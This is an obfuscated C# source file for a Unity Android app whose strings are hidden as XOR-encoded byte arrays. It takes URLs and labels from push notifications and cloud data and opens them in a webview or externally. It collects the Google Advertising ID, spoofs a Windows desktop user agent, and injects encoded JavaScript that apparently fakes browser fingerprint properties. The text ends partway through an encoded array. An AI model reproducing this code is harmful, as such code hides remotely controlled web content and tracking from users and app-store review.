using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0x2d0123df : MonoBehaviour
{
    internal bool _0xb68e7695(string _0x8b3b5ff8)
    {
        return _0x8b3b5ff8.StartsWith(_0x019ade1a._0xa5740c93(new byte[9] { 89, 85, 70, 95, 81, 64, 14, 27, 27 }, 52), StringComparison.OrdinalIgnoreCase) || _0x8b3b5ff8.StartsWith(_0x019ade1a._0xa5740c93(new byte[24] { 140, 144, 144, 148, 151, 222, 203, 203, 148, 136, 133, 157, 202, 131, 139, 139, 131, 136, 129, 202, 135, 139, 137, 203 }, 228), StringComparison.OrdinalIgnoreCase) || _0x8b3b5ff8.StartsWith(_0x019ade1a._0xa5740c93(new byte[23] { 164, 184, 184, 188, 246, 227, 227, 188, 160, 173, 181, 226, 171, 163, 163, 171, 160, 169, 226, 175, 163, 161, 227 }, 204), StringComparison.OrdinalIgnoreCase);
    }

    private string _0x7331d679 = "";
    private int _0x7e618d1e = 5, _0x4c542eba = 5, _0xc78bc8c1 = 5, _0xa4db84c2 = 5;
    private IEnumerator _0x13e54d27(Dictionary<string, object> _0xeb18f1ae)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[30] { 246, 249, 200, 222, 217, 240, 141, 235, 200, 217, 206, 197, 141, 232, 213, 217, 223, 204, 141, 253, 216, 222, 197, 141, 233, 204, 217, 204, 151, 141 }, 173) + string.Join(_0x019ade1a._0xa5740c93(new byte[1] { 179 }, 186), _0xeb18f1ae));
#endif
            }
        }

        string _0xe4fe15f8 = "";
        // Primary source: nested JSON under "notificationData"
        if (_0xeb18f1ae != null && _0xeb18f1ae.TryGetValue(_0x019ade1a._0xa5740c93(new byte[16] { 133, 132, 159, 130, 141, 130, 136, 138, 159, 130, 132, 133, 175, 138, 159, 138 }, 235), out var raw))
        {
            try
            {
                var _0x921fa437 = raw?.ToString();
                var _0x08201257 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x921fa437);
                if (_0x08201257 != null && _0x08201257.TryGetValue(_0x019ade1a._0xa5740c93(new byte[6] { 156, 138, 129, 139, 134, 139 }, 239), out var val))
                {
                    _0xe4fe15f8 = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x019ade1a._0xa5740c93(new byte[30] { 75, 68, 117, 99, 100, 48, 64, 101, 99, 120, 77, 48, 90, 67, 95, 94, 48, 96, 113, 98, 99, 117, 48, 117, 98, 98, 127, 98, 42, 48 }, 16) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0xe4fe15f8) && _0xeb18f1ae != null && _0xeb18f1ae.TryGetValue(_0x019ade1a._0xa5740c93(new byte[6] { 43, 61, 54, 60, 49, 60 }, 88), out var lab))
        {
            _0xe4fe15f8 = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[38] { 113, 126, 79, 89, 94, 10, 122, 95, 89, 66, 119, 10, 108, 79, 94, 73, 66, 79, 78, 10, 89, 79, 68, 78, 67, 78, 10, 76, 88, 69, 71, 10, 64, 89, 69, 68, 16, 10 }, 42) + _0xe4fe15f8);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0xe4fe15f8))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[38] { 122, 117, 68, 82, 85, 1, 113, 84, 82, 73, 124, 1, 118, 64, 72, 85, 1, 85, 78, 1, 78, 81, 68, 79, 1, 86, 72, 85, 73, 1, 82, 68, 79, 69, 72, 69, 27, 1 }, 33) + _0xe4fe15f8);
            }
#endif
        }

        _0x8faf629c = _0xe4fe15f8;
        yield return new WaitUntil(() => _0x7608da72);
        var _0x27e61ea4 = _0x6ff14ded(2, 100);
        yield return new WaitUntil(() => _0x27e61ea4.IsCompleted);
        string _0xf7a59f45 = _0x27e61ea4.Result;
        if (!string.IsNullOrEmpty(_0xf7a59f45))
        {
            string _0xdd5c7e73 = _0xc682821f(_0xf7a59f45, _0xe4fe15f8);
            {
#if B_LOGS
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[33] { 207, 192, 241, 231, 224, 180, 196, 225, 231, 252, 201, 180, 198, 241, 248, 251, 245, 240, 180, 195, 241, 246, 194, 253, 241, 227, 180, 227, 253, 224, 252, 174, 180 }, 148) + _0xdd5c7e73);
#endif
            }

            _0x21de6645.Load(_0xdd5c7e73);
        }
    }

    private string _0xa8cd78ab = "";
    private int _0x07730f16 = -1;
    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0x4002e2b0(string _0x387504a3, string _0xeffe760b)
    {
        try
        {
            using var _0x40f182dc = Aes.Create();
            _0x40f182dc.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xeffe760b));
            _0x40f182dc.GenerateIV();
            using var _0x43bf85c0 = new MemoryStream();
            _0x43bf85c0.Write(_0x40f182dc.IV, 0, _0x40f182dc.IV.Length);
            using (var _0x7dc30170 = new CryptoStream(_0x43bf85c0, _0x40f182dc.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0x348d9238 = Encoding.UTF8.GetBytes(_0x387504a3);
                _0x7dc30170.Write(_0x348d9238, 0, _0x348d9238.Length);
                _0x7dc30170.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0x43bf85c0.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string _0xc682821f(string _0xe24a9725, string _0x72d2db8e)
    {
        if (string.IsNullOrEmpty(_0x72d2db8e))
            return _0xe24a9725;
        if (_0xe24a9725.Contains(_0x019ade1a._0xa5740c93(new byte[1] { 130 }, 189)))
            return _0xe24a9725 + _0x019ade1a._0xa5740c93(new byte[8] { 14, 91, 77, 70, 76, 65, 76, 21 }, 40) + UnityWebRequest.EscapeURL(_0x72d2db8e);
        else
            return _0xe24a9725 + _0x019ade1a._0xa5740c93(new byte[8] { 128, 204, 218, 209, 219, 214, 219, 130 }, 191) + UnityWebRequest.EscapeURL(_0x72d2db8e);
    }

    private static readonly string WindowsDesktopUserAgent = _0x019ade1a._0xa5740c93(new byte[111] { 179, 145, 132, 151, 146, 146, 159, 209, 203, 208, 206, 222, 214, 169, 151, 144, 154, 145, 137, 141, 222, 176, 170, 222, 207, 206, 208, 206, 197, 222, 169, 151, 144, 200, 202, 197, 222, 134, 200, 202, 215, 222, 191, 142, 142, 146, 155, 169, 155, 156, 181, 151, 138, 209, 203, 205, 201, 208, 205, 200, 222, 214, 181, 182, 170, 179, 178, 210, 222, 146, 151, 149, 155, 222, 185, 155, 157, 149, 145, 215, 222, 189, 150, 140, 145, 147, 155, 209, 207, 204, 206, 208, 206, 208, 206, 208, 206, 222, 173, 159, 152, 159, 140, 151, 209, 203, 205, 201, 208, 205, 200 }, 254);
    private string GetFailingUrl(UniWebViewNativeResultPayload _0x90e44439)
    {
        if (_0x90e44439 == null || _0x90e44439.Extra == null)
            return null;
        object _0xfd288bad;
        if (!_0x90e44439.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0xfd288bad))
            return null;
        return _0xfd288bad as string;
    }

    private bool _0x730747f6 = false;
    private bool _0xbd3faab8(string _0xbbc670b9, string _0xa4fdedb2)
    {
        string _0x1349ee39 = _0x652494af(_0xbbc670b9);
        if (string.IsNullOrEmpty(_0x1349ee39))
            _0x1349ee39 = _0xa4fdedb2;
        if (_0xb84273eb(_0x1349ee39))
            return true;
        string _0xa426e591 = string.IsNullOrEmpty(_0x1349ee39) ? _0x019ade1a._0xa5740c93(new byte[29] { 179, 175, 175, 171, 168, 225, 244, 244, 171, 183, 186, 162, 245, 188, 180, 180, 188, 183, 190, 245, 184, 180, 182, 244, 168, 175, 180, 169, 190 }, 219) : _0x019ade1a._0xa5740c93(new byte[46] { 24, 4, 4, 0, 3, 74, 95, 95, 0, 28, 17, 9, 94, 23, 31, 31, 23, 28, 21, 94, 19, 31, 29, 95, 3, 4, 31, 2, 21, 95, 17, 0, 0, 3, 95, 20, 21, 4, 17, 25, 28, 3, 79, 25, 20, 77 }, 112) + _0x1349ee39;
        WLog(_0x019ade1a._0xa5740c93(new byte[35] { 22, 61, 39, 58, 56, 48, 25, 60, 62, 48, 117, 56, 52, 39, 62, 48, 33, 117, 51, 52, 57, 57, 55, 52, 54, 62, 117, 52, 38, 117, 34, 48, 55, 111, 117 }, 85) + _0xa426e591);
        return _0xa43b83a9(_0xa426e591);
    }

    private RectTransform _0x84eb34f5;
    private string _0x423cd5cf = "";
    private bool _0xb931fcd5 = false;
    private string _0xc06c4b6a;
    private void _0xe0c3eca4(string _0xd98d376a)
    {
        Dictionary<string, object> _0x89f3393a;
        try
        {
            _0x89f3393a = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xd98d376a);
        }
        catch
        {
            return;
        }

        var _0x53195f68 = ReadPushField(_0x89f3393a, _0x019ade1a._0xa5740c93(new byte[3] { 14, 9, 23 }, 123));
        if (string.IsNullOrWhiteSpace(_0x53195f68))
            return;
        _0x53195f68 = _0x53195f68.Trim();
        if (!IsHttpUrl(_0x53195f68))
            return;
        if (string.Equals(_0x53195f68, _0xc06c4b6a, StringComparison.Ordinal))
            return;
        _0xc06c4b6a = _0x53195f68;
        OpenUrlExternally(_0x53195f68);
    }

    private string _0xf158ca5f = "";
    private IEnumerator _0x3230dcfd(float _0x6d3c883d)
    {
        yield return new WaitForSeconds(_0x6d3c883d);
        if (!_0x0246a40a)
        {
            _0x0246a40a = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0xc99f1e39}");
                }
#endif
            }
        }
    }

    private bool _0x987abf3a()
    {
        var _0xf1108bf0 = Keyboard.current;
        return _0xf1108bf0 != null && _0xf1108bf0.escapeKey.wasPressedThisFrame;
    }

    private Canvas _0xda7ab8cb()
    {
        if (_0xd1771ecc != null)
            return _0xd1771ecc;
        var _0xed23356c = gameObject.GetComponentInChildren<Canvas>();
        if (_0xed23356c == null)
        {
            var _0x5988fb71 = new GameObject(_0x019ade1a._0xa5740c93(new byte[6] { 172, 142, 129, 153, 142, 156 }, 239), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0xed23356c = _0x5988fb71.GetComponent<Canvas>();
            _0xed23356c.transform.SetParent(transform, false);
            _0xed23356c.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0xd1771ecc = _0xed23356c;
        return _0xd1771ecc;
    }

    // PART 3
    private string _0x23209454()
    {
        try
        {
            var _0x92532206 = new AndroidJavaClass(_0x019ade1a._0xa5740c93(new byte[30] { 40, 36, 38, 101, 62, 37, 34, 63, 50, 120, 47, 101, 59, 39, 42, 50, 46, 57, 101, 30, 37, 34, 63, 50, 27, 39, 42, 50, 46, 57 }, 75));
            var _0x169c377a = _0x92532206.GetStatic<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[15] { 239, 249, 254, 254, 233, 226, 248, 205, 239, 248, 229, 250, 229, 248, 245 }, 140));
            var _0xd7be72ad = new AndroidJavaClass(_0x019ade1a._0xa5740c93(new byte[57] { 201, 197, 199, 132, 205, 197, 197, 205, 198, 207, 132, 203, 196, 206, 216, 197, 195, 206, 132, 205, 199, 217, 132, 203, 206, 217, 132, 195, 206, 207, 196, 222, 195, 204, 195, 207, 216, 132, 235, 206, 220, 207, 216, 222, 195, 217, 195, 196, 205, 227, 206, 233, 198, 195, 207, 196, 222 }, 170));
            var _0x94e74454 = _0xd7be72ad.CallStatic<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[20] { 51, 49, 32, 21, 48, 34, 49, 38, 32, 61, 39, 61, 58, 51, 29, 48, 29, 58, 50, 59 }, 84), _0x169c377a);
            var _0xb0614ac6 = _0x94e74454.Call<string>(_0x019ade1a._0xa5740c93(new byte[5] { 8, 10, 27, 38, 11 }, 111));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0xb0614ac6}");
#endif
            }

            return string.IsNullOrEmpty(_0xb0614ac6) ? "" : _0xb0614ac6;
        }
        catch
        {
            return "";
        }
    }

    // WS_SOURCE MONO
    public static _0x2d0123df _0x35715d42 { get; private set; }

    private bool _0x54e350ff(string _0x13bf75b2)
    {
        try
        {
            using (var _0x9b9bc5ca = new AndroidJavaClass(_0x019ade1a._0xa5740c93(new byte[30] { 49, 61, 63, 124, 39, 60, 59, 38, 43, 97, 54, 124, 34, 62, 51, 43, 55, 32, 124, 7, 60, 59, 38, 43, 2, 62, 51, 43, 55, 32 }, 82)))
            using (var _0x6a5f90ab = _0x9b9bc5ca.GetStatic<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[15] { 72, 94, 89, 89, 78, 69, 95, 106, 72, 95, 66, 93, 66, 95, 82 }, 43)))
            using (var _0x6b471b95 = _0x6a5f90ab.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[17] { 128, 130, 147, 183, 134, 132, 140, 134, 128, 130, 170, 134, 137, 134, 128, 130, 149 }, 231)))
            using (var _0x175c9784 = new AndroidJavaClass(_0x019ade1a._0xa5740c93(new byte[22] { 191, 176, 186, 172, 177, 183, 186, 240, 189, 177, 176, 170, 187, 176, 170, 240, 151, 176, 170, 187, 176, 170 }, 222)))
            using (var _0xec24a7a9 = _0x175c9784.CallStatic<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[8] { 2, 19, 0, 1, 23, 39, 0, 27 }, 114), _0x13bf75b2, 1))
            {
                string _0x1e7549fb = _0xec24a7a9.Call<string>(_0x019ade1a._0xa5740c93(new byte[14] { 114, 112, 97, 70, 97, 103, 124, 123, 114, 80, 109, 97, 103, 116 }, 21), _0x019ade1a._0xa5740c93(new byte[20] { 140, 156, 129, 153, 157, 139, 156, 177, 136, 143, 130, 130, 140, 143, 141, 133, 177, 155, 156, 130 }, 238));
                string _0x2935bdb7 = _0xec24a7a9.Call<string>(_0x019ade1a._0xa5740c93(new byte[10] { 196, 198, 215, 243, 194, 192, 200, 194, 196, 198 }, 163));
                _0xec24a7a9.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[11] { 99, 102, 102, 65, 99, 118, 103, 101, 109, 112, 123 }, 2), _0x019ade1a._0xa5740c93(new byte[33] { 105, 102, 108, 122, 103, 97, 108, 38, 97, 102, 124, 109, 102, 124, 38, 107, 105, 124, 109, 111, 103, 122, 113, 38, 74, 90, 71, 95, 91, 73, 74, 68, 77 }, 8));
                _0xec24a7a9.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[11] { 108, 123, 115, 113, 104, 123, 91, 102, 106, 108, 127 }, 30), _0x019ade1a._0xa5740c93(new byte[20] { 43, 59, 38, 62, 58, 44, 59, 22, 47, 40, 37, 37, 43, 40, 42, 34, 22, 60, 59, 37 }, 73));
                if (_0xec24a7a9.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[15] { 188, 171, 189, 161, 162, 184, 171, 143, 173, 186, 167, 184, 167, 186, 183 }, 206), _0x6b471b95) != null)
                {
                    WLog(_0x019ade1a._0xa5740c93(new byte[24] { 55, 28, 6, 27, 25, 17, 56, 29, 31, 17, 84, 27, 4, 17, 26, 84, 29, 26, 0, 17, 26, 0, 78, 84 }, 116) + _0x13bf75b2);
                    _0xec24a7a9.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[8] { 30, 27, 27, 57, 19, 30, 24, 12 }, 127), 0x10000000);
                    _0x6a5f90ab.Call(_0x019ade1a._0xa5740c93(new byte[13] { 155, 156, 137, 154, 156, 169, 139, 156, 129, 158, 129, 156, 145 }, 232), _0xec24a7a9);
                    return true;
                }

                if (_0xb84273eb(_0x2935bdb7))
                    return true;
                if (!string.IsNullOrEmpty(_0x1e7549fb))
                {
                    WLog(_0x019ade1a._0xa5740c93(new byte[28] { 233, 194, 216, 197, 199, 207, 230, 195, 193, 207, 138, 195, 196, 222, 207, 196, 222, 138, 204, 203, 198, 198, 200, 203, 201, 193, 144, 138 }, 170) + _0x1e7549fb);
                    if (_0xb68e7695(_0x1e7549fb))
                        return _0xbd3faab8(_0x1e7549fb, _0x2935bdb7);
                    return _0xa43b83a9(_0x1e7549fb);
                }

                WLog(_0x019ade1a._0xa5740c93(new byte[30] { 95, 116, 110, 115, 113, 121, 80, 117, 119, 121, 60, 117, 114, 104, 121, 114, 104, 60, 114, 115, 60, 116, 125, 114, 120, 112, 121, 110, 38, 60 }, 28) + _0x13bf75b2);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x019ade1a._0xa5740c93(new byte[26] { 85, 126, 100, 121, 123, 115, 90, 127, 125, 115, 54, 127, 120, 98, 115, 120, 98, 54, 112, 119, 127, 122, 115, 114, 44, 54 }, 22) + e.Message);
            return true;
        }
    }

    private string _0x94c8e13f = "";
    private string _0x37f917ba = "";
    private async Task<bool> _0xaab630fe()
    {
        {
#if B_LOGS
            Debug.Log(_0x019ade1a._0xa5740c93(new byte[37] { 134, 137, 184, 174, 169, 128, 253, 142, 180, 186, 179, 148, 179, 136, 179, 180, 169, 164, 142, 184, 175, 171, 180, 190, 184, 174, 156, 179, 178, 179, 164, 176, 178, 168, 174, 177, 164 }, 221));
#endif
        }

        try
        {
            var _0x7f4f4eed = new InitializationOptions();
            await UnityServices.InitializeAsync(_0x7f4f4eed);
            {
#if B_LOGS
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[32] { 23, 24, 41, 63, 56, 17, 108, 25, 34, 37, 56, 53, 31, 41, 62, 58, 37, 47, 41, 63, 108, 5, 34, 37, 56, 37, 45, 32, 37, 54, 41, 40 }, 76));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[20] { 131, 146, 132, 131, 247, 130, 185, 190, 163, 174, 132, 178, 165, 161, 190, 180, 178, 164, 237, 247 }, 215) + ex.Message);
#endif
            }

            _0x35715d42?._0xaea71745();
            return true;
        }

        bool _0x3a1a19cb = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0x3a1a19cb = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x019ade1a._0xa5740c93(new byte[37] { 168, 167, 150, 128, 135, 174, 211, 160, 154, 148, 157, 222, 154, 157, 211, 178, 157, 156, 157, 138, 158, 156, 134, 128, 221, 211, 163, 159, 146, 138, 150, 129, 211, 186, 183, 201, 211 }, 243) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0xc9862e79 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x019ade1a._0xa5740c93(new byte[25] { 137, 152, 142, 137, 253, 142, 180, 186, 179, 240, 180, 179, 253, 156, 168, 169, 181, 253, 152, 143, 143, 146, 143, 231, 253 }, 221) + ex.Message);
#endif
                }

                _0x35715d42?._0xaea71745();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x019ade1a._0xa5740c93(new byte[28] { 155, 138, 156, 155, 239, 156, 166, 168, 161, 226, 166, 161, 239, 157, 170, 190, 186, 170, 188, 187, 239, 138, 157, 157, 128, 157, 245, 239 }, 207) + ex.Message);
#endif
                }

                _0x35715d42?._0xaea71745();
                return true;
            }
        }
        while (!_0x3a1a19cb);
        return false;
    }

    private IEnumerator _0x2f9dff1d(string _0x67983630)
    {
        if (Permission.HasUserAuthorizedPermission(_0x67983630))
            yield break;
        bool _0xc61de822 = false;
        var _0xdfc518d2 = new PermissionCallbacks();
        _0xdfc518d2.PermissionGranted += _0xd3450b8d => _0xc61de822 = true;
        _0xdfc518d2.PermissionDenied += _0xd3450b8d => _0xc61de822 = true;
        Permission.RequestUserPermission(_0x67983630, _0xdfc518d2);
        yield return new WaitUntil(() => _0xc61de822);
    }

    private readonly List<UniWebViewPopup> _0xbcf7cc63 = new List<UniWebViewPopup>();
    private void _0xbe659bab(bool _0x9476f2b6)
    {
        _0x8ec9417c();
        _0x1b1b5926.SetActive(_0x9476f2b6);
        _0x69d913d5 = _0x9476f2b6;
        if (_0x9476f2b6)
        {
            _0x1b1b5926.transform.SetAsLastSibling();
            if (_0x84eb34f5 != null)
                _0x84eb34f5.localRotation = Quaternion.identity;
        }
    }

    private void _0xd24295c6()
    {
        if (_0x21de6645 == null)
            return;
        if (_0x9c72ce68)
            _0x21de6645.SetUserAgent(_0xada17828());
        else
            _0x21de6645.SetUserAgent("");
    }

    private bool _0x99644d4e = false;
    private GameObject _0x1b1b5926;
    private string _0xd92a0b29 = "";
    private AndroidJavaObject _0x12f177fe { get; set; }

    private bool _0x69b8ee0b = false;
    private string _0x92d13daa()
    {
        return _0x019ade1a._0xa5740c93(new byte[12] { 214, 152, 139, 144, 157, 138, 151, 145, 144, 214, 215, 133 }, 254) + _0x019ade1a._0xa5740c93(new byte[8] { 174, 185, 170, 248, 173, 185, 229, 255 }, 216) + WindowsDesktopUserAgent + _0x019ade1a._0xa5740c93(new byte[2] { 82, 78 }, 117) + _0x019ade1a._0xa5740c93(new byte[30] { 213, 194, 209, 131, 211, 209, 204, 215, 204, 158, 237, 194, 213, 202, 196, 194, 215, 204, 209, 141, 211, 209, 204, 215, 204, 215, 218, 211, 198, 152 }, 163) + _0x019ade1a._0xa5740c93(new byte[121] { 129, 146, 137, 132, 147, 142, 136, 137, 199, 131, 130, 129, 207, 136, 133, 141, 203, 140, 130, 158, 203, 145, 134, 139, 206, 156, 147, 149, 158, 156, 168, 133, 141, 130, 132, 147, 201, 131, 130, 129, 142, 137, 130, 183, 149, 136, 151, 130, 149, 147, 158, 207, 136, 133, 141, 203, 140, 130, 158, 203, 156, 128, 130, 147, 221, 129, 146, 137, 132, 147, 142, 136, 137, 207, 206, 156, 149, 130, 147, 146, 149, 137, 199, 145, 134, 139, 220, 154, 203, 132, 136, 137, 129, 142, 128, 146, 149, 134, 133, 139, 130, 221, 147, 149, 146, 130, 154, 206, 220, 154, 132, 134, 147, 132, 143, 207, 130, 206, 156, 154, 154 }, 231) + _0x019ade1a._0xa5740c93(new byte[26] { 61, 60, 63, 113, 41, 43, 54, 45, 54, 117, 126, 44, 42, 60, 43, 24, 62, 60, 55, 45, 126, 117, 44, 56, 112, 98 }, 89) + _0x019ade1a._0xa5740c93(new byte[130] { 71, 70, 69, 11, 83, 81, 76, 87, 76, 15, 4, 66, 83, 83, 117, 70, 81, 80, 74, 76, 77, 4, 15, 4, 22, 13, 19, 3, 11, 116, 74, 77, 71, 76, 84, 80, 3, 109, 119, 3, 18, 19, 13, 19, 24, 3, 116, 74, 77, 21, 23, 24, 3, 91, 21, 23, 10, 3, 98, 83, 83, 79, 70, 116, 70, 65, 104, 74, 87, 12, 22, 16, 20, 13, 16, 21, 3, 11, 104, 107, 119, 110, 111, 15, 3, 79, 74, 72, 70, 3, 100, 70, 64, 72, 76, 10, 3, 96, 75, 81, 76, 78, 70, 12, 18, 17, 19, 13, 19, 13, 19, 13, 19, 3, 112, 66, 69, 66, 81, 74, 12, 22, 16, 20, 13, 16, 21, 4, 10, 24 }, 35) + _0x019ade1a._0xa5740c93(new byte[30] { 61, 60, 63, 113, 41, 43, 54, 45, 54, 117, 126, 41, 53, 56, 45, 63, 54, 43, 52, 126, 117, 126, 14, 48, 55, 106, 107, 126, 112, 98 }, 89) + _0x019ade1a._0xa5740c93(new byte[34] { 47, 46, 45, 99, 59, 57, 36, 63, 36, 103, 108, 61, 46, 37, 47, 36, 57, 108, 103, 108, 12, 36, 36, 44, 39, 46, 107, 2, 37, 40, 101, 108, 98, 112 }, 75) + _0x019ade1a._0xa5740c93(new byte[30] { 254, 255, 252, 178, 234, 232, 245, 238, 245, 182, 189, 247, 251, 226, 206, 245, 239, 249, 242, 202, 245, 243, 244, 238, 233, 189, 182, 170, 179, 161 }, 154) + _0x019ade1a._0xa5740c93(new byte[449] { 177, 183, 188, 190, 179, 164, 183, 229, 176, 164, 161, 248, 190, 167, 183, 164, 171, 161, 182, 255, 158, 190, 167, 183, 164, 171, 161, 255, 226, 134, 173, 183, 170, 168, 172, 176, 168, 226, 233, 179, 160, 183, 182, 172, 170, 171, 255, 226, 244, 247, 245, 226, 184, 233, 190, 167, 183, 164, 171, 161, 255, 226, 130, 170, 170, 162, 169, 160, 229, 134, 173, 183, 170, 168, 160, 226, 233, 179, 160, 183, 182, 172, 170, 171, 255, 226, 244, 247, 245, 226, 184, 233, 190, 167, 183, 164, 171, 161, 255, 226, 139, 170, 177, 248, 132, 250, 135, 183, 164, 171, 161, 226, 233, 179, 160, 183, 182, 172, 170, 171, 255, 226, 247, 241, 226, 184, 152, 233, 168, 170, 167, 172, 169, 160, 255, 163, 164, 169, 182, 160, 233, 181, 169, 164, 177, 163, 170, 183, 168, 255, 226, 146, 172, 171, 161, 170, 178, 182, 226, 233, 162, 160, 177, 141, 172, 162, 173, 128, 171, 177, 183, 170, 181, 188, 147, 164, 169, 176, 160, 182, 255, 163, 176, 171, 166, 177, 172, 170, 171, 237, 236, 190, 183, 160, 177, 176, 183, 171, 229, 149, 183, 170, 168, 172, 182, 160, 235, 183, 160, 182, 170, 169, 179, 160, 237, 190, 164, 183, 166, 173, 172, 177, 160, 166, 177, 176, 183, 160, 255, 226, 189, 253, 243, 226, 233, 167, 172, 177, 171, 160, 182, 182, 255, 226, 243, 241, 226, 233, 168, 170, 167, 172, 169, 160, 255, 163, 164, 169, 182, 160, 233, 168, 170, 161, 160, 169, 255, 226, 226, 233, 181, 169, 164, 177, 163, 170, 183, 168, 255, 226, 146, 172, 171, 161, 170, 178, 182, 226, 233, 181, 169, 164, 177, 163, 170, 183, 168, 147, 160, 183, 182, 172, 170, 171, 255, 226, 244, 240, 235, 245, 235, 245, 226, 233, 176, 164, 131, 176, 169, 169, 147, 160, 183, 182, 172, 170, 171, 255, 226, 244, 247, 245, 235, 245, 235, 245, 235, 245, 226, 184, 236, 254, 184, 184, 254, 138, 167, 175, 160, 166, 177, 235, 161, 160, 163, 172, 171, 160, 149, 183, 170, 181, 160, 183, 177, 188, 237, 181, 183, 170, 177, 170, 233, 226, 176, 182, 160, 183, 132, 162, 160, 171, 177, 129, 164, 177, 164, 226, 233, 190, 162, 160, 177, 255, 163, 176, 171, 166, 177, 172, 170, 171, 237, 236, 190, 183, 160, 177, 176, 183, 171, 229, 176, 164, 161, 254, 184, 233, 166, 170, 171, 163, 172, 162, 176, 183, 164, 167, 169, 160, 255, 177, 183, 176, 160, 184, 236, 254, 184, 166, 164, 177, 166, 173, 237, 160, 236, 190, 184 }, 197) + _0x019ade1a._0xa5740c93(new byte[112] { 76, 77, 78, 0, 91, 75, 90, 77, 77, 70, 4, 15, 95, 65, 76, 92, 64, 15, 4, 25, 17, 26, 24, 1, 19, 76, 77, 78, 0, 91, 75, 90, 77, 77, 70, 4, 15, 64, 77, 65, 79, 64, 92, 15, 4, 25, 24, 16, 24, 1, 19, 76, 77, 78, 0, 91, 75, 90, 77, 77, 70, 4, 15, 73, 94, 73, 65, 68, 127, 65, 76, 92, 64, 15, 4, 25, 17, 26, 24, 1, 19, 76, 77, 78, 0, 91, 75, 90, 77, 77, 70, 4, 15, 73, 94, 73, 65, 68, 96, 77, 65, 79, 64, 92, 15, 4, 25, 24, 28, 24, 1, 19 }, 40) + _0x019ade1a._0xa5740c93(new byte[45] { 13, 11, 0, 2, 14, 16, 23, 29, 22, 14, 87, 22, 23, 13, 22, 12, 26, 17, 10, 13, 24, 11, 13, 68, 12, 23, 29, 28, 31, 16, 23, 28, 29, 66, 4, 26, 24, 13, 26, 17, 81, 28, 80, 2, 4 }, 121) + _0x019ade1a._0xa5740c93(new byte[721] { 194, 196, 207, 205, 192, 215, 196, 150, 217, 196, 223, 209, 139, 193, 223, 216, 210, 217, 193, 152, 219, 215, 194, 213, 222, 251, 211, 210, 223, 215, 152, 212, 223, 216, 210, 158, 193, 223, 216, 210, 217, 193, 159, 141, 193, 223, 216, 210, 217, 193, 152, 219, 215, 194, 213, 222, 251, 211, 210, 223, 215, 139, 208, 195, 216, 213, 194, 223, 217, 216, 158, 199, 159, 205, 192, 215, 196, 150, 197, 139, 229, 194, 196, 223, 216, 209, 158, 199, 159, 152, 194, 217, 250, 217, 193, 211, 196, 245, 215, 197, 211, 158, 159, 141, 223, 208, 158, 197, 152, 223, 216, 210, 211, 206, 249, 208, 158, 145, 198, 217, 223, 216, 194, 211, 196, 140, 150, 213, 217, 215, 196, 197, 211, 145, 159, 136, 139, 134, 202, 202, 197, 152, 223, 216, 210, 211, 206, 249, 208, 158, 145, 222, 217, 192, 211, 196, 140, 150, 216, 217, 216, 211, 145, 159, 136, 139, 134, 202, 202, 197, 152, 223, 216, 210, 211, 206, 249, 208, 158, 145, 219, 215, 206, 155, 193, 223, 210, 194, 222, 145, 159, 136, 139, 134, 202, 202, 197, 152, 223, 216, 210, 211, 206, 249, 208, 158, 145, 219, 215, 206, 155, 210, 211, 192, 223, 213, 211, 155, 193, 223, 210, 194, 222, 145, 159, 136, 139, 134, 159, 